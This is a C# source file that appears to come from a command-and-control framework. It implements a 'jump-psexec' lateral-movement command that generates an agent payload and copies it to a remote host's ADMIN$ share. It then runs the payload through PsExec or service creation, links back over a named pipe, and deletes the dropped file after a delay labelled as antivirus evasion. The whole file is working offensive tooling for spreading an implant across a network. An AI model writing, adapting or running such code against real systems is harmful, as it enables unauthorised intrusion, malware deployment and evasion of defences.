using System;
using System.Collections.Generic;
using System.CommandLine;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Commander.Commands.Agent;
using Commander.Commands.Composite;
using Commander.Commands.Scripted;
using Commander.Executor;
using Common;
using Common.Payload;
using Shared;
using Spectre.Console;

namespace Commander.Commands.Agent.LateralMovement
{
    public class JumpPsExecCommandOptions
    {
        public string target { get; set; }
        public bool verbose { get; set; }
        public string pipe { get; set; }
        public string file { get; set; }
        public string path { get; set; }
        public string service { get; set; }
        public bool inject { get; set; }

        public string endpoint { get; set; }
        public int injectDelay { get; set; }

        public string injectProcess { get; set; }

        public bool x86 { get; set; }


    }
    public class JumpPsExecCommand : ScriptCommand<JumpPsExecCommandOptions>
    {
        public override string Category => CommandCategory.LateralMovement;
        public override string Description => "Obtain system agent using Services";
        public override string Name => "jump-psexec";
        public override ExecutorMode AvaliableIn => ExecutorMode.AgentInteraction;

        public override RootCommand Command => new RootCommand(Description)
        {
            new Argument("target", "Target where the service will be started"),
            new Option<string>(new[] { "--endpoint", "-b" }, () => null, "EndPoint to Bind To"),
             new Option(new[] { "--verbose", "-v" }, "Show details of the command execution."),
             new Option<string>(new[] { "--pipe", "-n" }, () => "jmp","Name of the pipe used to pivot."),
             new Option<string>(new[] { "--file", "-f" }, () => ShortGuid.NewGuid(),"Name of payload."),
             new Option<string>(new[] { "--service", "-s" }, () => "jmpsvc","Name of service."),
             new Option<string>(new[] { "--path", "-p" }, () => "ADMIN$","Name of the folder to upload the payload."),
             new Option(new[] { "--inject", "-i" }, "Îf the payload should be an injector"),
             new Option<int>(new[] { "--injectDelay", "-id" },() => 30, "Delay before injection (AV evasion)"),
             new Option<string>(new[] { "--injectProcess", "-ip" },() => null, "Process path used for injection"),
             new Option(new[] { "--x86", "-x86" }, "Generate a x86 architecture executable"),
        };

        protected override void Run(ScriptingAgent<JumpPsExecCommandOptions> agent, ScriptingCommander<JumpPsExecCommandOptions> commander, ScriptingTeamServer<JumpPsExecCommandOptions> teamServer, JumpPsExecCommandOptions options, CommanderConfig config)
        {
            if (string.IsNullOrEmpty(options.endpoint))
            {
                options.endpoint = $"pipe://127.0.0.1:{options.pipe}";
                commander.WriteLine($"No Endpoint selected, taking the current agent enpoint ({options.endpoint})");
            }

            var endpoint = ConnexionUrl.FromString(options.endpoint);
            if (!endpoint.IsValid)
            {
                commander.WriteError($"[X] EndPoint is not valid !");
                return;
            }

            var payloadOptions = new PayloadGenerationOptions()
            {
                Architecture = agent.Metadata.Architecture == "x86" ? PayloadArchitecture.x86 : PayloadArchitecture.x64,
                Endpoint = endpoint,
                IsDebug = false,
                IsVerbose = options.verbose,
                ServerKey = config.ServerConfig.Key,
                Type = PayloadType.Service,
                InjectionDelay = options.injectDelay,
                IsInjected = options.inject,
                InjectionProcess = options.injectProcess
            };

            if (!string.IsNullOrEmpty(options.injectProcess))
                payloadOptions.InjectionProcess = options.injectProcess;

            commander.WriteInfo($"[>] Generating Payload!");
            var pay = commander.GeneratePayload(payloadOptions, options.verbose);
            if (pay == null)
                commander.WriteError($"[X] Generation Failed!");
            else
                commander.WriteSuccess($"[+] Generation succeed!");

            commander.WriteLine($"Preparing to upload the file...");

            var fileName = string.IsNullOrEmpty(options.file) ? ShortGuid.NewGuid() + ".exe" : options.file;
            if (Path.GetExtension(fileName).ToLower() != ".exe")
                fileName += ".exe";

            string path = (options.target.StartsWith("\\\\") ? string.Empty : "\\\\") + options.target + (options.path.StartsWith('\\') || options.target.StartsWith('\\') ? string.Empty : '\\') + options.path + (options.path.EndsWith('\\') ? string.Empty : '\\') + fileName;

            agent.Echo($"Downloading file {fileName} to {path}");
            agent.Upload(pay, path);
            agent.Delay(1);
            agent.Echo($"Executing PsExec");
            agent.PsExec(options.target, path);

            agent.Delay(2);


            if (options.inject)
            {
                agent.Echo($"Waiting {options.injectDelay + 10}s to evade antivirus");
                agent.Delay(options.injectDelay + 10);

                agent.Echo($"Removing injector {path}");
                agent.Shell($"del {path}");
            }
            else
            {
                agent.Echo($"[!] Don't forget to remove executable after use! : shell del {path}");
            }

            if (endpoint.Protocol == ConnexionType.NamedPipe)
            {
                var targetEndPoint = ConnexionUrl.FromString($"rpipe://{options.target}:{options.pipe}");
                agent.Echo($"Linking to {targetEndPoint}");
                agent.Link(targetEndPoint);
            }



            agent.Echo($"[*] Execution done!");
            agent.Echo(Environment.NewLine);
        }

        //protected override async Task<bool> CreateComposition(CommandContext<GetSystemCommandOptions> context)
        //{
        //    var agent = context.Executor.CurrentAgent;
        //    if(agent.Metadata.Integrity != "High")
        //    {
        //        context.Terminal.WriteError($"[X] Agent should be in High integrity context!");
        //        return false;
        //    }

        //    //var endpoint = ConnexionUrl.FromString(agent.Metadata.EndPoint);
        //    var endpoint = ConnexionUrl.FromString($"pipe://127.0.0.1:{context.Options.pipe}");

        //    var options = new PayloadGenerationOptions()
        //    {
        //        Architecture =  agent.Metadata.Architecture == "x86" ? PayloadArchitecture.x86 : PayloadArchitecture.x64,
        //        Endpoint = endpoint,
        //        IsDebug = false,
        //        IsVerbose = context.Options.verbose,
        //        ServerKey = context.Config.ServerConfig.Key,
        //        Type = PayloadType.Service,
        //        IsInjected = context.Options.inject
        //    };
        //    if (context.Options.injectDelay.HasValue)
        //        options.InjectionDelay = context.Options.injectDelay.Value;
        //    if (!string.IsNullOrEmpty(context.Options.injectProcess))
        //        options.InjectionProcess = context.Options.injectProcess;

        //    context.Terminal.WriteInfo($"[>] Generating Payload!");
        //    var pay = context.GeneratePayloadAndDisplay(options, context.Options.verbose);
        //    if (pay == null)
        //    {
        //        context.Terminal.WriteError($"[X] Generation Failed!");
        //        return false;
        //    }
        //    else
        //        context.Terminal.WriteSuccess($"[+] Generation succeed!");



        //    context.Terminal.WriteLine($"Preparing to upload the file...");

        //    var fileName = string.IsNullOrEmpty(context.Options.file) ? ShortGuid.NewGuid() + ".exe" : context.Options.file;
        //    if (Path.GetExtension(fileName).ToLower() != ".exe")
        //        fileName += ".exe";

        //    string path = context.Options.path + (context.Options.path.EndsWith('\\') ? String.Empty : '\\') + fileName;

        //    var fileId = await context.UploadAndDisplay(pay, fileName, "Uploading Payload");
        //    await context.CommModule.TaskAgentToDownloadFile(agent.Metadata.Id, fileId);

        //    this.Step($"Downloading file {fileName} to {path}");
        //    this.Dowload(fileName, fileId, path);
        //    this.Delay(1);
        //    this.Step($"Starting pivot {endpoint}");
        //    this.StartPivot(endpoint);
        //    this.Delay(1);
        //    this.Step($"Creating service");
        //    this.Shell($"sc create {context.Options.service} binPath= \"{path}\"");
        //    this.Step($"Starting service");
        //    this.Shell($"sc start {context.Options.service}");

        //    if (!context.Options.inject)
        //    {
        //        this.Step($"Removing service");
        //        this.Shell($"sc delete {context.Options.service}");
        //        this.Echo($"[!] Don't forget to remove service binary after use! : shell del {path}");
        //    }
        //    else
        //    {
        //        this.Step($"Waiting {options.InjectionDelay + 10}s to evade antivirus");
        //        this.Delay(options.InjectionDelay + 10);
        //        this.Step($"Removing service");
        //        this.Shell($"sc delete {context.Options.service}");
        //        this.Step($"Removing injector {path}");
        //        this.Shell($"del {path}");
        //    }


        //    this.Echo($"[*] Execution done!");
        //    this.Echo(Environment.NewLine);

        //    return true;
        //}
    }
}
